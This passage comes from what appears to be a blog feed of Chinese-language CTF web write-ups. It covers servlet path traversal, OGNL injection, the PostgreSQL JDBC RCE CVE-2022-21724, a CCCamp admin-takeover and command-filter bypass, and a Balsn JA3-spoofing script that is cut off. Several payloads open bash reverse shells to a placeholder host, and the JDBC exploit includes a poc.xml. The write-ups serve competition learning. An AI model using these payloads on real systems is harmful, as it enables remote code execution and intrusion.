class="name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.71.184.68:50042/%64%6f%77%6e%6c%6f%61%64?filename=../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/example/demo/EvilServlet.class</span><br></pre></td></tr></table></figure><p><strong>EvilServlet.class</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: _.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_com_example_demo_EvilServlet.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;Evil_Cmd_Arguments_fe37627fed78&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil_Cmd_Arguments_fe37627fed78=%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2Fxx.xx.xx.xx%2F2333%200%3E%261</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ7tJI"><img src="https://z1.ax1x.com/2023/11/05/piQ7tJI.jpg" alt="piQ7tJI.jpg"></a></p><h3 id="YourBatis"><a href="#YourBatis" class="headerlink" title="YourBatis"></a>YourBatis</h3><p>ognlå‘½ä»¤æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/user?username=%24%7B%40java.lang.Runtime%40getRuntime().exec(%22%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2Fxx.xx.xx.xx%2F2333%200%3E%261%22)%7D</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piQ7NWt"><img src="https://z1.ax1x.com/2023/11/05/piQ7NWt.jpg" alt="piQ7NWt.jpg"></a></p><h3 id="TestConnection"><a href="#TestConnection" class="headerlink" title="TestConnection"></a>TestConnection</h3><p><strong>PostgreSQL JDBC Driver RCE(CVE-2022-21724)</strong></p><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver=org.postgresql.Driver&amp;url=jdbc%3Apostgresql%3A%2F%2F127.0.0.1%3A5432%2Ftest%2F%3FsocketFactory%3Dorg.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fxx.xx.xx.xx%3A8000%2Fpoc.xml&amp;username=1&amp;password=1</span><br></pre></td></tr></table></figure><p><strong>poc.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag"> http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/xx.xx.xx.xx/2333 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åå¼¹shell<a href="https://imgse.com/i/piQz8js"><img src="https://z1.ax1x.com/2023/11/06/piQz8js.jpg" alt="piQz8js.jpg"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
        <tags>
            
            <tag> competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>old fragmented wp ~</title>
      <link href="/2023/10/25/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/"/>
      <url>/2023/10/25/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="CCCamp-CTF-2023"><a href="#CCCamp-CTF-2023" class="headerlink" title="CCCamp CTF 2023"></a>CCCamp CTF 2023</h1><h2 id="Cybercrime-Society-Club-Germany"><a href="#Cybercrime-Society-Club-Germany" class="headerlink" title="Cybercrime Society Club Germany"></a>Cybercrime Society Club Germany</h2><p>é•¿è¿™æ ·</p><p><a href="https://imgse.com/i/piVscr9"><img src="https://z1.ax1x.com/2023/10/25/piVscr9.jpg" alt="piVscr9.jpg"></a></p><p>ç»™äº†ä»£ç ï¼Œæœ‰å¦‚ä¸‹å‡ ä¸ªåŠŸèƒ½</p><p>æ³¨å†Œ</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_create_account</span>(<span class="params">data, user</span>):</span><br><span class="line">    dt = data[<span class="string">&quot;data&quot;</span>]</span><br><span class="line">    email = dt[<span class="string">&quot;email&quot;</span>]</span><br><span class="line">    password = dt[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">    groupid = dt[<span class="string">&quot;groupid&quot;</span>]</span><br><span class="line">    userid=dt[<span class="string">&quot;userid&quot;</span>]</span><br><span class="line">    activation = dt[<span class="string">&quot;activation&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> email == <span class="string">&quot;admin@cscg.de&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;cant create admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(groupid) == <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(userid) == <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    userid = json.loads(<span class="string">&quot;1&quot;</span> + groupid + userid)</span><br><span class="line">    <span class="comment"># print(dt)</span></span><br><span class="line">    <span class="comment"># print(userid)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_activation_code(activation):</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;Activation Code Wrong&quot;</span>)</span><br><span class="line">    <span class="comment"># print(&quot;activation passed&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> userdb.add_user(email, userid, password):</span><br><span class="line">        <span class="comment"># print(&quot;user created&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> success_msg(<span class="string">&quot;User Created&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;User creation failed&quot;</span>)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­éœ€è¿›è¡Œ<code>check_activation_code()</code>éªŒè¯</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_activation_code</span>(<span class="params">activation_code</span>):</span><br><span class="line">    <span class="comment"># no bruteforce</span></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;:0&gt;4&#125;&quot;</span>.<span class="built_in">format</span>(random.randint(<span class="number">0</span>, <span class="number">10000</span>)) <span class="keyword">in</span> activation_code:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥çš„éªŒè¯ğŸç­‰äºä»£ç ä¸­ç”Ÿæˆçš„åœ¨<code>0000-9999</code>ä¸­ä¸€ä¸ªéšæœºçš„å››ä½æ•°</p><p>åªéœ€å­˜åœ¨å³å¯ï¼Œæ‰€ä»¥ä¼ å…¥æ‰€æœ‰å››ä½æ•°å³å¯æ»¡è¶³æ¡ä»¶</p><p>çœ‹åˆ°éœ€è¦æˆä¸ºadminå³å¯æ‰§è¡Œå‘½ä»¤</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_admin</span>(<span class="params">data, user</span>):</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;Not logged in&quot;</span>)</span><br><span class="line">    is_admin = userdb.is_admin(user[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;User is not Admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd = data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="comment"># currently only &quot;date&quot; is supported</span></span><br><span class="line">    <span class="keyword">if</span> validate_command(cmd):</span><br><span class="line">        out = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        <span class="keyword">return</span> success_msg(out.stdout.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error_msg(<span class="string">&quot;invalid command&quot;</span>)</span><br></pre></td></tr></table></figure><p>is_adminåˆ¤æ–­æ˜¯å¦ä¸ºadminçš„ä¸¤ä¸ªæ¡ä»¶</p><ul><li><code>user[&quot;email&quot;] == &quot;admin@cscg.de&quot;</code></li><li><code>user[&quot;userid&quot;] &gt; 90000000</code></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_admin</span>(<span class="params">self, email</span>):</span><br><span class="line">    user = self.db.get(email)</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#TODO check userid type etc</span></span><br><span class="line">    <span class="keyword">return</span> user[<span class="string">&quot;email&quot;</span>] == <span class="string">&quot;admin@cscg.de&quot;</span> <span class="keyword">and</span> user[<span class="string">&quot;userid&quot;</span>] &gt; <span class="number">90000000</span></span><br></pre></td></tr></table></figure><p>æ³¨å†ŒåŠŸèƒ½ä¸­è§„å®š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> email == <span class="string">&quot;admin@cscg.de&quot;</span>:</span><br><span class="line">    <span class="keyword">return</span> error_msg(<span class="string">&quot;cant create admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(groupid) == <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(userid) == <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><code>user[&quot;userid&quot;] &gt; 90000000</code>ç”¨ç§‘å­¦è®¡æ•°æ³•<code>9e99</code></p><p><a href="https://imgse.com/i/piVsmDA"><img src="https://z1.ax1x.com/2023/10/25/piVsmDA.png" alt="piVsmDA.png"></a></p><p>ç™»å½•åå¤šäº†æ›´æ”¹ã€åˆ é™¤é‚®ç®±åŠŸèƒ½</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_edit_account</span>(<span class="params">data, user</span>):</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;not logged in&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    new = data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;email&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> userdb.change_user_mail(user[<span class="string">&quot;email&quot;</span>], new):</span><br><span class="line">        <span class="keyword">return</span> success_msg(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;Fail&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_delete_account</span>(<span class="params">data, user</span>):</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;not logged in&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;email&quot;</span>] != user[<span class="string">&quot;email&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;Hey thats not your email!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(data[<span class="string">&quot;data&quot;</span>].values()))</span><br><span class="line">    <span class="keyword">if</span> delete_accs(data[<span class="string">&quot;data&quot;</span>].values()):</span><br><span class="line">        <span class="keyword">return</span> success_msg(<span class="string">&quot;deleted account&quot;</span>)    </span><br></pre></td></tr></table></figure><p><code>delete_account</code>ä¼šéå†<code>data[&quot;data&quot;]</code>æ‰€æœ‰å€¼ï¼Œå¯å€Ÿæ­¤åˆ é™¤adminçš„é‚®ç®±ï¼Œå†é€šè¿‡<code>edit_account</code>å°†å½“å‰ç”¨æˆ·é‚®ç®±æ›´æ”¹ä¸ºadmin</p><p><a href="https://imgse.com/i/piVsi4K"><img src="https://z1.ax1x.com/2023/10/25/piVsi4K.png" alt="piVsi4K.png"></a></p><p>æ³¨å†Œç¬¬äºŒä¸ªè´¦æˆ·</p><p><a href="https://imgse.com/i/piVrO9U"><img src="https://z1.ax1x.com/2023/10/25/piVrO9U.png" alt="piVrO9U.png"></a></p><p>ä¸Šå»åé‚®ç®±æ”¹ä¸ºadminï¼Œ<code>validate_command(string)</code>è¦æ±‚å‘½ä»¤é•¿åº¦ä¸º4ä¸”å¿…é¡»ä»¥dateå¼€å¤´</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">api_admin</span>(<span class="params">data, user</span>):</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;Not logged in&quot;</span>)</span><br><span class="line">    is_admin = userdb.is_admin(user[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin:</span><br><span class="line">        <span class="keyword">return</span> error_msg(<span class="string">&quot;User is not Admin&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd = data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;cmd&quot;</span>]</span><br><span class="line">    <span class="comment"># currently only &quot;date&quot; is supported</span></span><br><span class="line">    <span class="keyword">if</span> validate_command(cmd):</span><br><span class="line">        out = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)</span><br><span class="line">        <span class="keyword">return</span> success_msg(out.stdout.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error_msg(<span class="string">&quot;invalid command&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_command</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(string) == <span class="number">4</span> <span class="keyword">and</span> string.index(<span class="string">&quot;date&quot;</span>) == <span class="number">0</span></span><br></pre></td></tr></table></figure><p>åˆ—è¡¨å½¢å¼ä¼ å…¥å››ä¸ªå‚æ•°ç»•è¿‡</p><p><a href="https://imgse.com/i/piVrqhT"><img src="https://z1.ax1x.com/2023/10/25/piVrqhT.png" alt="piVrqhT.png"></a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;date&quot;, &quot;-f&quot;, &quot;flag.txt&quot;, &quot;-u&quot;]</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piVrHA0"><img src="https://z1.ax1x.com/2023/10/25/piVrHA0.png" alt="piVrHA0.png"></a></p><h1 id="Balsn-CTF"><a href="#Balsn-CTF" class="headerlink" title="Balsn CTF"></a>Balsn CTF</h1><h2 id="0FA"><a href="#0FA" class="headerlink" title="0FA"></a>0FA</h2><p>ç”¨æˆ·åä¸ºadminåŒæ—¶é€šè¿‡ja3æŒ‡çº¹éªŒè¯è¾“å‡ºflag</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FINGERPRINT&quot;</span>, <span class="string">&quot;771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0&quot;</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;BALSN&#123;fake_flag&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fingerprint_check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_SSL_JA3&#x27;</span>] !== FINGERPRINT) </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Login Failed!&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>flag.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fingerprint_check</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Login failed!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Balsn CTF <span class="number">2023</span> - <span class="number">0</span>FA&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  Here is your flag: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$flag</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>JA3(S)ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•è€Œæœ‰æ•ˆçš„ TLS æŒ‡çº¹ã€‚</p><p>githubä¸Šæ‰¾åˆ°å¯ä»¥ä¼ªé€ ja3æŒ‡çº¹çš„ä¸€ä¸ªé¡¹ç›®ï¼š<a href="https://github.com/Danny-Dasilva/CycleTLS#example-cycletls-request-for-typescript-and-javascript">https://github.com/Danny-Dasilva/CycleTLS#example-cycletls-request-for-typescript-and-javascript</a></p><p><strong>exp</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> initCycleTLS = <span class="built_in">require</span>(<span class="string">&#x27;cycletls&#x27;</span>);</span><br><span class="line"><span class="comment">// Typescript: import initCycleTLS from &#x27;cycletls&#x27;;</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// Initiate CycleTLS</span></span><br><span class="line">  <span class="keyword">const</span> cycleTLS = <span class="keyword">await</span> <span class="title function_">initCycleTLS</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Send request</span></span><br><span class="line"><span class="comment">//   const response = await cycleTLS(&#x27;https://0fa.balsnctf.com:8787/index.php&#x27;)</span></span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">cycleTLS</span>(<span class="string">&#x27;https://xx.xx.xx.xx:8787/flag.php&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;username=admin&#x27;</span>,</span><br><span class="line">    <span class="attr">ja3</span>: <span class="string">&#x27;771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,</span><br><span class="line">    <span class="attr">userAgent</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0&#x27;</span>,</span><br><span class="line">  &#125;, <span 